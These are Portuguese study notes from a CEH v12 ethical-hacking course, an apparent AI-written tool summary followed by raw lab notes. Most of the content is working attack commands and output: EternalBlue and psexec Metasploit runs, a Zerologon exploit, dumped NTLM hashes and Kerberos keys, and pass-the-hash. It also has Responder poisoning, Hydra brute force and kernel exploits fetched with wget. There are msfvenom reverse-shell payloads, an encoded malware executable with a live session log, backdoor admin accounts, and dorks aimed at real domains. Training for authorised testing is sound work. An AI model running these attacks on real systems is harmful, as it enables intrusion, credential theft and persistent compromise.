Resumo CEH v12 Treimanemto 


IA Faça Resumo com o uso das ferramentas e as separe por categoria

Seu documento descreve um curso de treinamento (CEHV12) para hacking ético, incluindo:

Passos para fazer o download e armazenar o certificado após a conclusão.

Vários comandos e ferramentas usadas em pentest (por exemplo, Python, ferramentas de OSINT, configuração de conexão, métodos de varredura).

Técnicas para enumeração, exploração e escalada de privilégios em diferentes plataformas (por exemplo, Windows, Linux).

Seções sobre diferentes módulos, como Segurança de Aplicações Web, Injeção de SQL, Wireless, Mobile e Cloud.

Instruções para usar ferramentas como Metasploit, Nmap, Hydra, Aircrack-ng e outras.

O documento fornece instruções detalhadas de linha de comando e links para recursos.


quero separadamente uso das ferramentes de acordo com o texto
Claro! Aqui está a lista separada das ferramentas e seus usos, conforme mencionado no texto:

Ferramentas OSINT:
searx.space: Ferramenta de busca para informações de código aberto.

https://dnsdumpster.com/
https://pentest-tools.com
https://www.shodan.io/
https://whois.domaintools.com
https://www.tamos.com
http://www.sabsoft.com
***************************************************


Preparação para Pentest:
Python:

Compilação para 32bits: apt-get install gcc-multilib g++-multilib

Invocar bash via Python: python -c 'import pty;pty.spawn("/bin/bash");'

Servidor web em Python: python3 -m http.server 80


Cheatsheet via linha de comando:


Exemplos: cht nmap, cht steghide, cht find, cht tcpdump

Ferramentas de Clonagem e Uso:
ctfr:

Clonagem: git clone https://github.com/UnaPibaGeek/ctfr.git

Instalação: pip3 install -r requirements.txt

Uso: python3 ctfr.py -d pimpao.com.br

dnsdumpster e crt.sh: Ferramentas para levantamento de subdomínios.

## Ferramentas de Enumeração:
theHarvester:

Busca no LinkedIn: theHarvester -d eccouncil -l 200 -b linkedin

Netcraft:

Levantamento de sistema operacional: sitereport.netcraft.com

Shodan:

Mapeamento de dispositivos: shodan.io

CEWL:

Gerar dicionários: cewl -d 2 -m 5 www.certifiedhacker.com -u "Firefox 5.1" -w /tmp/dicionario.txt

## Ferramentas Recon-ng:
Recon-ng:

Criação de workspaces e módulos:

bash
recon-ng
workspaces create CEH
modules load recon/domains-hosts/brute_hosts
Scanning e Enumeração de Rede:
hping3:

Scanning e XMAS: hping3 -S -p 80 192.168.10.101

Nmap:

SNMP: nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse

Exploração e Privilege Escalation:
Metasploit:

## Uso do exploit ms17-010: Ilab cai 

bash
search ms17-010
use 2
set rhosts 10.10.10.7
set payload windows/x64/meterpreter/reverse_tcp
exploit
Impacket:

Uso do secretsdump: impacket-secretsdump.py -just-dc CEH/SERVER2016$@10.10.10.16

Ferramentas de Invasão de Sistema:
Responder:

## Captura por envenenamento: responder -I eth0 Ilab

## Hydra: Ilab

Quebra de senha: hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113

Ferramentas de Wireless:
Aircrack-ng:

Quebra de senha de handshake: aircrack-ng -w dicionario.txt pacotescapturados.pcap

Crunch:

Gerar dicionário em memória: crunch 8 8 0123456789 | aircrack-ng -t -h -b macaddressaccesspoint pacotescapturados.cap -w -

Ferramentas de Mobile:
Phonesploit:

Conectar via ADB e capturar screenshots.

Ferramentas de Cloud:
AWS CLI:

Instalação e configuração:

bash
pip3 install awscli
aws configure
S3Scanner:

Procurar e fazer dump de buckets:

bash
cd /opt/S3Scanner
python3 s3scanner.py sites.txt -d
Essas são as ferramentas listadas e o uso conforme o conteúdo do seu documento. Precisa de mais alguma coisa?

Sem resumo


############################
AULA
############################

ferramenta de osint: searx.space

## DORKS

# site:microsoft.com -site:www.microsoft.comCEHV11

intext:("mysql_connect"|"mysqli_connect") filetype:bkp
intext:@gmail filetype:xls site:acaditi.com.br

---

como utilizar:

cht nmap
cht steghide
cht find
cht tcpdump

site da ferramenta: [https://github.com/UnaPibaGeek/ctfr](https://github.com/UnaPibaGeek/ctfr)

clonagem da ferramenta
git clone [https://github.com/UnaPibaGeek/ctfr.git](https://github.com/UnaPibaGeek/ctfr.git)
apt-get install python3-pip

cd /opt/ctfr
pip3 install -r requirements.txt
python3 [ctfr.py](http://ctfr.py/) -d [pimpao.com.br](http://pimpao.com.br/)

## outras formas de levantamento de subdomínios

[https://dnsdumpster.com](https://dnsdumpster.com/)[https://github.com/tdubs/crt.sh](https://github.com/tdubs/crt.sh) (em bash)

intext:("mysql_connect"|"mysqli_connect") filetype:old

filetype:sql "mysql dump"

DORKS PRONTAS E EXPLOITS

[https://www.exploit-db.com/](https://www.exploit-db.com/)

## procura algo em ftp na internet

abrir o site [https://www.searchftps.net/](https://www.searchftps.net/)

## buscando pessoas no linkedin que trabalham na eccouncil ( nao funcionando no parrot em 2022)

theHarvester -d eccouncil -l 200 -b linkedin

## LEVANTAMENTO DE SISTEMA OPERACIONAL DO ALVO

[https://sitereport.netcraft.com](https://sitereport.netcraft.com/)


theHarvester -d acadi-ti -l 200 -b linkedin


MAPEAMENTO
[https://www.shodan.io/](https://www.shodan.io/)

procurando emails de um dominio theHarvester -d [11ct.eb.mil.br](http://11ct.eb.mil.br/) -l 500 -b google

CEWL
cewl -d 2 -m 5 [www.certifiedhacker.com](http://www.certifiedhacker.com/) -u "Firefox 5.1" -w /tmp/dicionario.txt

osrframework
pip3 install osrframework
[usufy.py](http://usufy.py/) -n Mark Zuckemberg -p twitter facebook youtube

OSINT
-------- LAB9.1-RECON-NG RECON-NG

# recon-ng

> marketplace install all > modules search
workspaces >workspaces create CEH >workspaces list
ceh> db insert domains text> certifiedhacker.com ceh> show domains
ceh> modules load brute
ceh> modules load recon/domains-hosts/brute_hosts ceh-brute>run
> 

ceh-brute> back
ceh> modules load reverse_resolve
ceh> modules load recon/hosts-hosts/reverse_resolve >run

> show hosts
modules load reporting
modules load reporting/html
options set FILENAME /tmp/results.html
options set CREATOR Eder
options set CUSTOMER certifiedhacker Networks >run
back
back
ver relatorio no browser
recon-ng
workspaces create reconnaissance
modules load recon/domains-contacts/whois_pocs info
options set SOURCE facebook.com
run
back
modules load recon/profiles-profiles/namechk options set SOURCE MarkZuckerberg
run
back
modules load recon/profiles-profiles/profiler options set SOURCE MarkZuckerberg
run
back
modules load reporting/html
options set FILENAME /tmp/reconnaissance.html options set CREATOR Eder
options set CUSTOMER Mark Zuckerberg
run
ver relatorio
> 

SCANNING

ederzao         paola de oliveira

- -----> SYN 300-----> 80
<---- ACK 301 / SYN 500
-------> ACK 501 --->
- ---> PUSH --->
- ----> SYN 200---> 21
<----- RST -------

escaneamento via hping
hping3 -S -p 80 192.168.10.101

```
         (XMAS)

```

- --> FIN URG PUSH ---> 80
nao ha resposta = porta aberta

<------RST -----------

- -> ACK ---->
- -> FIN

80 443 53 123 udp/tcp

## REDE TOR

apt-get install tor
service tor start
tor-resolve [www.condor.com.br](http://www.condor.com.br/)
proxychains3 nmap -sT -p 80 [www.condor.com.br](http://www.condor.com.br/)

## ENUMERATION

SNMP
locate *.nse | grep snmp
nmap -sU -p 161 192.168.10.103 --scrip=snmp-win32-shares.nse
nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse
snmp-check 192.168.10.103

DNS
desafio 192.168.10.100

NFS
showmount -e 192.168.10.159
mount -t nfs 192.168.10.159:/home/vulnix /tmp/eder cd /tmp/eder

FTP
nmap -sV -p 21 192.168.10.0/24 --=ftp-anon.nse

SIP
apt-get install sip-vicious
svmap 192.168.10.0/24

SMB
nbtscan -r 192.168.10.0/24

HTTP/HTTPS
curl --head [www.smaff.com.br](http://www.smaff.com.br/)
whatweb [www.smaff.com.br](http://www.smaff.com.br/)
nikto -h 192.168.10.107

***************************************************
* Module 6 - System Hacking *

#Quebra de senha LLMNR (Link Local Multicast Name Resolution) e NBT-NS (NetBIOS Name Service) 
sudo responder -I eth0
<no windows fazer uma requisição>
<no responder copiar o hash>
sudo su
pluma hash.txt
<cola o hash>
<salva o arquivo>
john hash.txt

#Gain Access to a Remote System using Reverse Shell Generator
docker run -d -p 80:80 reverse_shell_generator
http://localhost
<ip><port><type listening><type payload>
<executa script>
<envia payload p/ windows e executa>


## MAQUINA 143 - WINDOWS 7

locate *.nse | grep smb-
nmap -sV 10.10.10.7 --=smb-vuln*

service postgresql start
msfconsole

> search ms17-010
use 2
options
set rhosts 10.10.10.7
rhosts => 10.10.10.7
set lport 4321
lport => 4321
set payload windows/x64/meterpreter/reverse_tcp
exploit
shell
> 

c:\whoami
net user ederzao entrar@123 /add
net localgroup administrators ederzao /add




## MAQ179 - ACTIVE DIRECTORY - senha: Pa$$w0rd

apenas para quem esta com seu kali proprio instalar

apt remove --purge impacket-s python3-impacket
cd /opt
git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git)
cd impacket
apt-get install python3-pip
cd

cd /opt
git clone [https://github.com/dirkjanm/CVE-2020-1472.git](https://github.com/dirkjanm/CVE-2020-1472.git)
cd /opt/CVE-2020-1472

reseta o AD explorando o zerologon 
python3 cve-2020-1472-exploit.py SERVER2016 10.10.10.16

extrai os usuarios do AD por meio da biblioteca 
impacket-secretsdump.py -just-dc CEH/SERVER2016\$@10.10.10.16


usando passthehash
impacket-psexec jason@10.10.10.16 -hashes aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf

ou
msfconsole
search psexec
use exploit/windows/smb/psexec
options
set rhosts 10.10.10.16
rhosts => 10.10.10.16
set smbuser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff
exploit
meterpreter> ps
achei o lssas.exe

> migrate -N lsass.exe
load kiwi
creds_all
> 

## MAQUINA 174 - WINDOWS 10

DESAFIO

---

MAQUINA 107 - TRIXBOX

TERMINAL1

msfconsole
search trixbox
use 0
set rhosts 192.168.10.144
set lhost 192.168.100.7
set lport 4321
exploit
meterpreter> shell'
python -c 'import pty;pty.spawn("/bin/bash");
uname -a
cat /etc/issue

## ESCALACAO DE PRIVILEGIO EM LINUX

TERMINAL2 - MEU PARROT
searchsploit linux local kernel 2.6.x 
cd /tmp
searchsploit -m 9545.c 

TERMINAL1 - MAQUINA INVADIDA
whereis gcc ----> descubro que nao tem gcc

TERMINAL2 - MEU PARROT
gcc  -m32 9545.c -o ederzao
python3 -m http.server 80

TERMINAL1 - MAQUINA INVADIDA
cd /tmp
wget [http://192.168.100.7/ederzao](http://192.168.100.7/ederzao)
chmod a+x ederzao
./ederzao
cat /root/flag.txt

NAO UTILIZANDO METASPLOIT

TERMINAL1 - parrot
apt-get install rlwrap
searchsploit trixbox 2.6.1
searchsploit -m [6045.py](http://6045.py/)
rlwrap nc -lvp 4321

TERMINAL2 - parrot
python2.7 [6045.py](http://6045.py/) 192.168.10.107 80 192.168.100.7 4321

## QUEBRA DE SENHAS OFFLINE (QUANDO EU TENHO O HASH)

wget [http://192.168.100.11/hashdumpmaq103.txt](http://192.168.100.11/hashdumpmaq103.txt)

eder:1008:48269d2eeb60a76cb75e0c8d76954a50:fab1fddd8b8c3541e7df9566cad256fb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
offsec:500:7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
pruebas:1009:8724a2914a8db2e15aacd84cd494924f:1d6d2758f9ebc3b1b5feb8c8b9283262:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::

## QUEBRA DE SENHAS ONLINE

em tempo real estamos tentando quebra a senha de um usuario chamado eder direto no servidor ssh

hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113

## CAPTURA POR ENVENENAMENTO NETBIOS SAMBA

levanta o servidor de host	enenamento
responder -I eth0

vai no windows10, loga com usuario jason e senha qwerty
e tenta fazer uma conexao como por exemplo \\CEH-Tools

capturar o hash que ficou gravado em /usr/share/responder/logs

john SMB-NTLMv2-SSP-10.10.10.10.txt

BUFFER OVERFLOW
tar -xzvf bufferoverflow.tar.gz
gerar byte array
!mona bytearray
\x00 = null byte
\x0a = new line \n (Linux)
\x0d = \r (linux)enter
!mona bytearray -cpb "\x00\x0a\x0d"
!mona compare -f c:\logs\Ability_Server\bytearray.bin -a 00c3b6a8
não esquecer os 16bytes perdidos

BUFFER OVEFLOW

criação do shellcode
msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.1 lport=4321 EXITFUNC=thread -b '\x00\x0a\x0d' -a x86 --platform Windows -f python

LOAD BALANCE
cd /opt
git clone [https://github.com/craig/ge.mine.nu.git](https://github.com/craig/ge.mine.nu.git)
./lbd.sh [www.itaipu.gov.br](http://www.itaipu.gov.br/) ./lbd.sh [www.tse.gov.br](http://www.tse.gov.br/)

PING SWEEP (DESCOBRINDO MAQUINAS NA REDE)
nmap -sn -PE 192.168.10.0/24 nbtscan -r 192.168.10.0/24

porta abertas e fechadas

PORTA ABERTA
eu server
-----> syn 100--------> 80
<----- ack 101 /syn 750---
-----> ack 751-------->

PORTA FECHADA
------ SYN 100-----> 80
<----- RST -------

INICIO A CONEXAO COM FLAGS NAO COMUNS (FIN, ACK, URG, PUSH) PORTA FECHADA

XMAS
----> FIN URG PUSH --> 21
<------- RST ----------

PORTA ABERTA
----> FIN URG PUSH --> 80
NO RESPONSE

euzinho paola de oliveira
----------> syn 1000 ----> 80
<---- ack 1001 / syn 50
---- ack 51 ----->

TOR
apt-get install tor proxychains
ifconfig

nbtscan -r x.x.x.0/24

updatedb
locate *.nse | grep snmp-

nmap -sU -p 161 --=snmp-win32-shares.nse 172.16.162.136 snmp-check 172.16.162.136

## dns

fierce -dns [smaff.com.br](http://smaff.com.br/)

INVASOES
MAQUINA 143

locate *.nse | grep smb-
nmap -sV ipmaquina --=smb-vuln*

msfconsole

> search ms17-010
use 2
options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.7
rhosts => 10.10.10.7
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.10.2
lhost => 10.10.10.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 4321
exploit
meterpreter> shell
cd c:\
attrib
type flag.txt
> 

## WINDOWS SERVER 2016 - ACTIVE DIRECTORY

Usando o zerologon pra cima do AD
python3 [cve-2020-1472-exploit.py](http://cve-2020-1472-exploit.py/) SERVER2016 10.10.10.16

extraindo os hashes utilizando o impacket do kali
[secretsdump.py](http://secretsdump.py/) -just-dc CEH/SERVER2016\$@10.10.10.16

Administrator:500:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d0e7dd5c1d5b8b4d5ce29c621252a94:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[CEH.com](http://ceh.com/)\jason:1105:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
[CEH.com](http://ceh.com/)\martin:1106:aad3b435b51404eeaad3b435b51404ee:5ebe7dfa074da8ee8aef1faa2bbde876:::
[CEH.com](http://ceh.com/)\sheila:1107:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
SERVER2016$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:ab0b830dd715f49c7f28d6f110d5b22540ffce04158883cbe7d37f38f1f51c2a
krbtgt:aes128-cts-hmac-sha1-96:18dab62c5b85028aa0ebcc2586408ddb
krbtgt:des-cbc-md5:7ffb768c3d751519
[CEH.com](http://ceh.com/)\jason:aes256-cts-hmac-sha1-96:13b07f00282597e13a6b25ccba5f0e41a7b889c74a958c990ea6f00935ff7fae
[CEH.com](http://ceh.com/)\jason:aes128-cts-hmac-sha1-96:bc742c1bd3cae1d44c5ac5115499a729
[CEH.com](http://ceh.com/)\jason:des-cbc-md5:02ad491a1f7f10bc
[CEH.com](http://ceh.com/)\martin:aes256-cts-hmac-sha1-96:f32aec4bcef9b96c9ee840b6e6d3dca490f3581e42ad10fbafbee6d51a54ee5e
[CEH.com](http://ceh.com/)\martin:aes128-cts-hmac-sha1-96:01f53cde24d40fd48d7c42ab8808726e
[CEH.com](http://ceh.com/)\martin:des-cbc-md5:d90b7302583dab31
[CEH.com](http://ceh.com/)\sheila:aes256-cts-hmac-sha1-96:0038843397c811c174792106db6e28f640ad9ee1da4212f7ea3744f2a015a8f8
[CEH.com](http://ceh.com/)\sheila:aes128-cts-hmac-sha1-96:96fbbdad91859b13e16948b8d0e29918
[CEH.com](http://ceh.com/)\sheila:des-cbc-md5:4c25b9c7327c755b
SERVER2016$:aes256-cts-hmac-sha1-96:0456f7a4d7e30bcbe5816a7206c8661f7974ca1821847cff8dfd0e45e1e9c414
SERVER2016$:aes128-cts-hmac-sha1-96:27184b5e87b0f1a248dbf2bb2120d060
SERVER2016$:des-cbc-md5:7f5208cd450131b6

subindo o metasploit
msfconsole

> search psexec
use 9
msf6 exploit(windows/smb/psexec) > set rhosts 10.10.10.16
rhosts => 10.10.10.16
msf6 exploit(windows/smb/psexec) > set lport 4321
lport => 4321
msf6 exploit(windows/smb/psexec) > set smbuser Administrator
smbuser => Administrator
msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff
smbpass => aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff
msf6 exploit(windows/smb/psexec) > set lhost 10.10.10.2
lhost => 10.10.10.2
msf6 exploit(windows/smb/psexec) > exploit
> 

meterpreter> ps
meterpreter> migrate nrprocessolasass.exe

flag
fbb9d2ef6221626ff6817c8d979edbd3
searchsploit freeswitch

WINDOWS 10 - 192.168.10.174

apos o nmap vimos o freeswitch instalado nele

searchsploit freeswitch
searchsploit -m 47799.txt
python3 [47799.py](http://47799.py/) 192.168.10.174 whoami
python3 [47799.py](http://47799.py/) 192.168.10.174 "dir C:\*"
python3 [47799.py](http://47799.py/) 192.168.10.174 "net user"4
python3 [47799.py](http://47799.py/) 192.168.10.174 "dir C:\Users\*"
python3 [47799.py](http://47799.py/) 192.168.10.174 "dir C:\Users\win10\*"
python3 [47799.py](http://47799.py/) 192.168.10.174 "dir C:\Users\win10\Documents\*"
python3 [47799.py](http://47799.py/) 192.168.10.174 "dir C:\Users\win10\Desktop\*"

python3 [47799.py](http://47799.py/) 192.168.10.174 "type C:\Users\win10\Desktop\flag.txt.txt"

"dir flag* /s /p"


SYSTEM HACKING

ATAQUE ONLINE COM RESPONDER
responder -I eth0

ir pro windows ligando com usuario jason/qwerty

no parrot = ATAQUE OFFLINE PARA QUEBRAR O HASH CAPTURADO PELO RESPONDER
gunzip /usr/share/wordlists/rockyou.txt.gz
john /usr/share/responder/logs/SMB-NTLMv2....txt --wordlist /usr/share/wordlists/rockyou.txt

ATAQUE ONLINE EM UM SERVIDOR SSH
hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113

ntfs data stream
criar um arquivo cehv11.txt com texto
echo "novo texto" > cehv11.txt:stream1

recuperar
more < cehv11.stream1

descobrir nfs data stream
dir /r

## esteganografia

apt-get install steghide
vi mensagemsecreta.txt
steghide embed -ef mensagemsecreta.txt -cf paola.jpg -sf paolastego.jpg

steghide extract -sf paolastego.jpg -xf mensagemdescoberta.txt
cat mensagemdescoberta.txt

---

malware
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.2 lport=4321 --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" -f exe -o meumalvadofavorito.exe

python3 -m http.server 80

msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.10.2
lhost => 10.10.10.2
msf6 exploit(multi/handler) > set lport 4321
lport => 4321
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.10.2:4321
[*] Sending stage (175174 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.10.2:4321 -> 10.10.10.10:61251) at 2021-01-25 21:32:03 -0300

meterpreter > getuid
Server username: WINDOWS10\Admin
meterpreter > hashdump
[-] 2007: Operation failed: The parameter is incorrect.
meterpreter > ps

Process List
============ lhost

PID   PPID  Name                         Arch  Session  User             Path

---

0     0     [System Process]
4     0     System
92    4     Registry
344   4     smss.exe
364   788   TabTip.exe                   x64   1
380   648   svchost.exe
388   648   svchost.exe
420   772   dllhost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\dllhost.exe
428   420   csrss.exe
516   508   csrss.exe
524   420   wininit.exe
548   772   StartMenuExperienceHost.exe  x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
584   508   winlogon.exe
648   524   services.exe
668   524   lsass.exe
736   772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
744   772   ShellExperienceHost.exe      x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
772   648   svchost.exe
788   648   svchost.exe
796   584   fontdrvhost.exe
800   524   fontdrvhost.exe
888   648   svchost.exe
904   772   SearchApp.exe                x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
1000  584   dwm.exe
1028  648   svchost.exe
1036  648   svchost.exe
1044  648   svchost.exe
1140  648   svchost.exe
1228  380   taskhostw.exe                x64   1        WINDOWS10\Admin  C:\Windows\System32\taskhostw.exe
1320  4     Memory Compression
1376  648   WUDFHost.exe
1564  648   svchost.exe
1644  648   svchost.exe
1660  648   svchost.exe
1736  648   svchost.exe
1956  648   svchost.exe
1984  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
2012  648   svchost.exe
2020  648   svchost.exe
2104  648   spoolsv.exe
2296  648   svchost.exe
2432  648   svchost.exe
2464  5164  SearchProtocolHost.exe       x64   1        WINDOWS10\Admin  C:\Windows\System32\SearchProtocolHost.exe
2508  648   armsvc.exe
2540  648   svchost.exe
2616  648   svchost.exe
2628  648   svchost.exe
2720  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
2784  648   svchost.exe
2792  648   VGAuthService.exe
2800  648   vmtoolsd.exe
2808  648   wlms.exe
2860  648   sppsvc.exe
2932  788   ctfmon.exe                   x64   1
2980  772   WmiPrvSE.exe
3204  4568  SecurityHealthSystray.exe    x64   1        WINDOWS10\Admin  C:\Windows\System32\SecurityHealthSystray.exe
3364  3892  GoogleCrashHandler64.exe
3392  772   WmiPrvSE.exe
3456  380   sihost.exe                   x64   1        WINDOWS10\Admin  C:\Windows\System32\sihost.exe
3500  648   svchost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\svchost.exe
3504  648   dllhost.exe
3788  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
3892  380   GoogleUpdate.exe
3916  648   msdtc.exe
4256  648   svchost.exe
4384  772   SppExtComObj.Exe
4548  4568  vm3dservice.exe              x64   1        WINDOWS10\Admin  C:\Windows\System32\vm3dservice.exe
4568  4540  explorer.exe                 x64   1        WINDOWS10\Admin  C:\Windows\explorer.exe
4752  648   svchost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\svchost.exe
4852  772   dllhost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\dllhost.exe
4916  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
4956  5664  meumalvadofavorito.exe       x86   1        WINDOWS10\Admin  C:\Users\Admin\Downloads\meumalvadofavorito.exe
5028  648   SecurityHealthService.exe
5076  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5164  648   SearchIndexer.exe
5200  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5432  772   MicrosoftEdge.exe            x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe
5440  772   ApplicationFrameHost.exe     x64   1        WINDOWS10\Admin  C:\Windows\System32\ApplicationFrameHost.exe
5612  648   SgrmBroker.exe
5664  772   browser_broker.exe           x64   1        WINDOWS10\Admin  C:\Windows\System32\browser_broker.exe
5712  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
5940  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5948  648   svchost.exe
5992  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
6108  5940  MicrosoftEdgeSH.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeSH.exe
6148  3892  GoogleCrashHandler.exe
6216  4568  vmtoolsd.exe                 x64   1        WINDOWS10\Admin  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
6320  4568  OneDrive.exe                 x86   1        WINDOWS10\Admin  C:\Users\Admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe
6424  648   svchost.exe
6696  5164  SearchFilterHost.exe
6728  772   TextInputHost.exe            x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe
6848  6620                   x86   1        WINDOWS10\Admin  C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe
6860  772   YourPhone.exe                x64   1        WINDOWS10\Admin  C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20092.123.0_x64__8wekyb3d8bbwe\YourPhone.exe

meterpreter > migrate 6848
[*] Migrating from 4956 to 6848...
[*] Migration completed successfully.
meterpreter > ps

# Process List

PID   PPID  Name                         Arch  Session  User             Path

---

0     0     [System Process]
4     0     System
92    4     Registry
344   4     smss.exe
364   788   TabTip.exe                   x64   1
380   648   svchost.exe
388   648   svchost.exe
420   772   dllhost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\dllhost.exe
428   420   csrss.exe
516   508   csrss.exe
524   420   wininit.exe
548   772   StartMenuExperienceHost.exe  x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
584   508   winlogon.exe
648   524   services.exe
668   524   lsass.exe
736   772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
744   772   ShellExperienceHost.exe      x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
772   648   svchost.exe
788   648   svchost.exe
796   584   fontdrvhost.exe
800   524   fontdrvhost.exe
888   648   svchost.exe
904   772   SearchApp.exe                x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
972   772   smartscreen.exe              x64   1        WINDOWS10\Admin  C:\Windows\System32\smartscreen.exe
1000  584   dwm.exe
1028  648   svchost.exe
1036  648   svchost.exe
1044  648   svchost.exe
1140  648   svchost.exe
1228  380   taskhostw.exe                x64   1        WINDOWS10\Admin  C:\Windows\System32\taskhostw.exe
1320  4     Memory Compression
1376  648   WUDFHost.exe
1564  648   svchost.exe
1644  648   svchost.exe
1660  648   svchost.exe
1736  648   svchost.exe
1956  648   svchost.exe
1984  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
2012  648   svchost.exe
2020  648   svchost.exe
2104  648   spoolsv.exe
2296  648   svchost.exe
2432  648   svchost.exe
2508  648   armsvc.exe
2540  648   svchost.exe
2616  648   svchost.exe
2628  648   svchost.exe
2720  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
2784  648   svchost.exe
2792  648   VGAuthService.exe
2800  648   vmtoolsd.exe
2808  648   wlms.exe
2860  648   sppsvc.exe
2932  788   ctfmon.exe                   x64   1
2980  772   WmiPrvSE.exe
3204  4568  SecurityHealthSystray.exe    x64   1        WINDOWS10\Admin  C:\Windows\System32\SecurityHealthSystray.exe
3364  3892  GoogleCrashHandler64.exe
3392  772   WmiPrvSE.exe
3456  380   sihost.exe                   x64   1        WINDOWS10\Admin  C:\Windows\System32\sihost.exe
3500  648   svchost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\svchost.exe
3504  648   dllhost.exe
3788  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
3892  380   GoogleUpdate.exe
3916  648   msdtc.exe
4256  648   svchost.exe
4384  772   SppExtComObj.Exe
4548  4568  vm3dservice.exe              x64   1        WINDOWS10\Admin  C:\Windows\System32\vm3dservice.exe
4568  4540  explorer.exe                 x64   1        WINDOWS10\Admin  C:\Windows\explorer.exe
4752  648   svchost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\svchost.exe
4852  772   dllhost.exe                  x64   1        WINDOWS10\Admin  C:\Windows\System32\dllhost.exe
